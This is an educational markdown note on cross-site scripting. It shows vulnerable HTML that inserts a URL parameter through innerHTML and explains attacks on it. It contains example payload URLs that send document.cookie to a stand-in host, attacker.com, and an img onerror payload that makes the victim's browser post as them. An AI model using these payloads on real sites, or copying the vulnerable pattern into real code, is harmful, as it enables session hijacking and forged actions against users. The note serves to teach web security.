
![[Pasted image 20251204122445.png]]

Cross-Site Scripting (XSS) is a **security vulnerability** where an attacker is able to inject and execute **malicious scripts** inside a trusted web application.  
These scripts run in the victim’s browser and can access anything that the legitimate page can access.

---
## What Attackers Can Steal
If an XSS attack succeeds, the attacker’s script can read sensitive data exposed by the webpage, such as:

- Cookies (including session cookies)
- Session data
- User information displayed on the page
- Potentially sensitive items like account balances or private UI data

Because the script executes **as if it came from your website**, the browser fully trusts it.

---
## How Attackers Inject Scripts
An attacker can inject malicious code in many places, including:

- URL parameters  
- User input fields  
- Form submissions  
- Comment sections / textboxes  
- Any data that is rendered back into HTML without proper sanitization

If the application displays or uses this unvalidated input in a way you did **not intend**, it results in XSS.

___
## XSS Vulnerabilities

When an attacker successfully injects a script into your application, it can lead to several serious security issues:

### 1. User Session Hijacking
If the script accesses cookies or session tokens, the attacker can impersonate the user.  
This allows them to log in as the victim and perform actions on their behalf.

### 2. Unauthorized Activities
Malicious scripts can trigger actions without the user’s knowledge.  
Example: sending messages, posting content, or performing transactions (e.g., sending Instagram DMs asking for money).

### 3. Keystroke Capture (Keylogging)
Injected scripts can monitor keyboard input.  
Anything typed—passwords, credit card numbers, search queries—can be sent to the attacker.

### 4. Stealing Critical Information (DOM Access)
The script can read and extract sensitive information directly from the DOM, including:
- Account details shown on the page  
- Hidden fields  
- Internal state that should not be exposed  

### 5. Phishing via Fake UI Elements
Attackers can inject fake forms, pop-ups, or UI components that look legitimate.  
Users unknowingly enter sensitive information, which is then captured by the attacker.

## Example of an XSS Vulnerability

Consider the following vulnerable HTML code:

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>XSS Example</title>
</head>
<body>
  <!-- Vulnerable Code -->
  <div>Welcome, <span id="username"></span>!</div>

  <script>
    // Function to set a cookie (normally set by the server)
    function setCookie(name, value, days) {
      const date = new Date();
      date.setTime(date.getTime() + days * 24 * 60 * 60 * 1000);
      const expires = "expires=" + date.toUTCString();
      document.cookie = name + "=" + value + ";" + expires + ";path=/";
    }

    // Example cookie for demonstration
    setCookie("exampleCookie", "Hello, Cookie!", 7);
  </script>

  <!-- Actual vulnerable part -->
  <script>
    const params = new URLSearchParams(window.location.search);
    const name = params.get("name");

    // ❌ Vulnerable: Directly injecting user input into HTML
    document.getElementById("username").innerHTML = name;
  </script>
</body>
</html>
```

---
### Why This Is Vulnerable

The app reads the `name` parameter from the URL and inserts it directly into the DOM using:

```js
document.getElementById("username").innerHTML = name;
```

Since `innerHTML` interprets the input as HTML, an attacker can inject malicious code in the URL.

---
### Example Attack Payload

An attacker can send a link like:

```
https://your-site.com/?name=<img src="https://attacker.com/steal?cookie=" + document.cookie >
```

Or more commonly:

```
https://your-site.com/?name=<script>fetch("https://attacker.com/steal?c=" + document.cookie)</script>
```

When the victim opens this link:

- The malicious HTML/script runs inside your page.
- The attacker’s script reads **document.cookie**.
- It sends the cookie to the attacker’s server.
- The attacker can now hijack the user’s session.

---
### Summary

The vulnerability exists because:

- **Untrusted user input** is placed into the DOM.
- **innerHTML** executes HTML and scripts.
- Attackers can craft URLs that inject script tags or image tags with malicious sources.

We will fix this later when we discuss **mitigations** such as sanitization, escaping, and safer DOM APIs.


# Unauthorized Activities Attack — Full Explanation With Code + Why It Works

Below is the vulnerable example where an attacker can force the user's browser to perform actions (like creating a post) **without needing to steal cookies**.

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>XSS Example</title>
  </head>
  <body>
    <div>
      Welcome, <span id="username"></span>! TimeZone,
      <span id="timezone"></span>!
    </div>

    <script>
      // Simple cookie-setting function (usually set by server)
      function setCookie(name, value, days) {
        const date = new Date();
        date.setTime(date.getTime() + days * 24 * 60 * 60 * 1000);
        const expires = "expires=" + date.toUTCString();
        document.cookie = name + "=" + value + ";" + expires + ";path=/";
      }

      setCookie("exampleCookie", "Hello, Cookie!", 7);
    </script>

    <!-- Vulnerable: injecting user-controlled input into the DOM -->
    <script>
      const params = new URLSearchParams(window.location.search);
      const name = params.get("name");
      document.getElementById("username").innerHTML = name;
    </script>

    <!-- Sensitive function exposed globally -->
    <script>
      function createPost(title, description) {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "/post", true);
        xhr.withCredentials = true; // cookies automatically included

        xhr.setRequestHeader(
          "Content-type",
          "application/x-www-form-urlencoded"
        );

        xhr.send(`txtName=${title}&mtxMessage=${description}`);
      }
    </script>
  </body>
</html>
```

---

## How an Attacker Exploits This

The attacker sends a malicious link like:

```
https://your-site.com/?name=<img src=x onerror="createPost('Hacked','Attacker posted this!')">
```

- The `<img>` fails to load → `onerror` fires  
- `createPost()` is called **as the logged-in user**  
- The victim unknowingly creates a post

---

# Does the Unauthorized Activities Attack Require Cookie Theft?

**No — the attacker does *not* need to steal cookies.**

### Why?

The malicious script runs **inside the victim’s browser**, on your domain.

Because of that:

- The browser automatically attaches cookies  
- The attacker’s script executes with the victim’s permissions  
- The attacker never needs to see the cookie at all  

When the attacker triggers:

```js
createPost("Hacked", "Attacker posted this!");
```

The browser sends:

- Session cookie  
- Authentication data  
- Permissions of that logged-in user  

The attacker simply makes the victim’s browser perform the action.

---

## When *Is* Cookie Theft Required?

Cookie theft is needed only if the attacker wants to:

- Log in as the user **from their own machine**
- Actually take over the session outside the victim's browser

Unauthorized activity attacks do **not** require this.

---

# Why This Works

Because the browser thinks:

> “This script is coming from example.com, so it must be trusted.”

The attacker just needs to place the malicious payload in:

- A URL parameter  
- A form field  
- Stored content (comments, profile fields)  
- Any location your site outputs to the DOM  
- Anything you insert using `innerHTML`  

Then attacker sends the link to you, you click it and then -

- Your vulnerable code places the attacker’s content into the DOM  
- The browser executes the script **as if your server wrote it**  
- Cookies and authentication are automatically included  
- The attacker gains the ability to perform actions as the victim  

> **Your vulnerable code does the rest.**



